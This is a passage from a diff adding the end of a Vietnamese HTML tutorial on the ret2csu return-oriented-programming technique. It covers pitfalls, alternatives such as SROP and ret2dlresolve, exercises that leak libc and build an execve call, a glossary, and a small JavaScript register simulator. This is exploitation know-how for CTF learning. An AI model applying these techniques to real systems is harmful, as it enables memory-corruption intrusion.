+    <div class="card"><h4>Gọi địa chỉ rác</h4><p>r15 là địa chỉ hàm thay vì ô GOT. Dùng &fn@got.</p></div>
+    <div class="card"><h4>rdi = số nhỏ lạ</h4><p>edi 32-bit cắt con trỏ. Set rdi riêng.</p></div>
+    <div class="card"><h4>Reg → đối số sai</h4><p>Thứ tự mov khác bản. Disasm csu thực tế.</p></div>
+    <div class="card"><h4>Lệch byte rác</h4><p>Sau call, csu pop 6 reg + ret → cần 56 byte bù.</p></div>
+    <div class="card"><h4>gcc ≥2.34 không có csu</h4><p>Dùng gadget khác / ret2dlresolve / SROP (xem §10).</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ</div>
+  <h2>Khi không có __libc_csu_init</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Toolchain</th><th>csu?</th><th>Thay thế</th></tr></thead>
+    <tbody>
+      <tr><td>gcc cũ (glibc &lt;2.34)</td><td class="yes">có __libc_csu_init</td><td>ret2csu (bài này)</td></tr>
+      <tr><td>gcc mới (≥2.34)</td><td class="no">không (dùng __libc_start_main mới)</td><td>Tìm gadget khác trong binary; <a href="ret2dlresolve.html">ret2dlresolve</a>; <a href="srop.html">SROP</a></td></tr>
+      <tr><td>Thiếu rdx nhưng có syscall</td><td class="maybe">—</td><td>SROP (sigreturn set mọi reg)</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Gadget tương tự</span>Ngay cả binary mới, đôi khi có gadget "mov rdx, ...; call/jmp" ở hàm khác — dùng ROPgadget tìm. Hoặc <a href="srop.html">SROP</a> set TẤT CẢ thanh ghi qua một sigreturn frame (mạnh hơn csu, chỉ cần 1 syscall gadget + rax=15).</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐⭐ · csu gọi write</div><p>Binary không có pop rdx: dùng csu gọi write(1, got, 8) để leak libc.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · csu + pop rdi → execve</div><p>csu set rsi/rdx, pop rdi set path, dựng execve bss.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · So với SROP</div><p>Giải cùng bài bằng SROP; so số gadget cần.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">ret2csu</div><p>Dùng gadget __libc_csu_init.</p></div>
+    <div class="card"><div class="term">gadget1</div><p>pop rbx,rbp,r12,r13,r14,r15.</p></div>
+    <div class="card"><div class="term">gadget2</div><p>mov rdx/rsi/edi; call [r15+rbx*8].</p></div>
+    <div class="card"><div class="term">rbx=0, rbp=1</div><p>Thoát loop, gọi *(r15).</p></div>
+    <div class="card"><div class="term">edi 32-bit</div><p>Đối số 1 bị cắt.</p></div>
+    <div class="card"><div class="term">call [r15]</div><p>r15 = ô GOT chứa con trỏ.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Nền: <a href="rop_basics.html">rop_basics</a>. Tiếp: <a href="ret2syscall_mprotect.html">ret2syscall/mprotect</a> · <a href="srop.html">SROP</a> · <a href="ret2dlresolve.html">ret2dlresolve</a>.</li>
+    <li>"Return-to-csu: a new method to bypass 64-bit Linux ASLR" (blackhat) · pwntools ROP docs.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 2 · Bài 8.</strong> ret2csu = gadget vạn năng set rdx & gọi hàm khi thiếu pop rdx. g1 nạp 6 reg (rbx=0,rbp=1), g2 mov rdx/rsi/edi + call [r15]. Nhớ edi 32-bit, r15=ô GOT. Tiếp theo: ret2dlresolve.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("csu-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("csu-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var st={rbx:"?",rbp:"?",r12:"?",r13:"?",r14:"?",r15:"?",rdi:"?",rsi:"?",rdx:"?"};
+  var regbox=document.getElementById("regbox"),msg=document.getElementById("simmsg");
+  function render(){
+    regbox.innerHTML=["rbx","rbp","r12","r13","r14","r15","rdi","rsi","rdx"].map(function(k){
+      return '<div style="border:1px solid var(--line);border-radius:6px;padding:5px 8px;background:var(--surface)"><b style="color:var(--accent)">'+k+'</b> = '+st[k]+'</div>';
+    }).join("");
+  }
+  document.getElementById("g1").addEventListener("click",function(){
+    st.rbx="0"; st.rbp="1"; st.r12="0 (fd)"; st.r13="bss (buf)"; st.r14="0x100 (len)"; st.r15="&read@got";
+    msg.textContent="gadget1: pop 6 reg xong. Giờ chạy gadget2 để chuyển vào rdx/rsi/edi & call.";
+    render();
+  });
+  document.getElementById("g2").addEventListener("click",function(){
+    if(st.r14==="?"){msg.textContent="Chạy gadget1 trước.";return;}
+    st.rdx="0x100 (từ r14)"; st.rsi="bss (từ r13)"; st.rdi="0 (edi từ r12d — 32bit!)";
+    msg.innerHTML="gadget2: rdx←r14, rsi←r13, edi←r12d, rồi <b>call *(r15)</b> = read(0, bss, 0x100). ✸ rbx+1==rbp → thoát loop.";
+    render();
+  });
+  document.getElementById("rs").addEventListener("click",function(){
+    Object.keys(st).forEach(function(k){st[k]="?";});msg.textContent="";render();
+  });
+  render();
+})();
+</script>
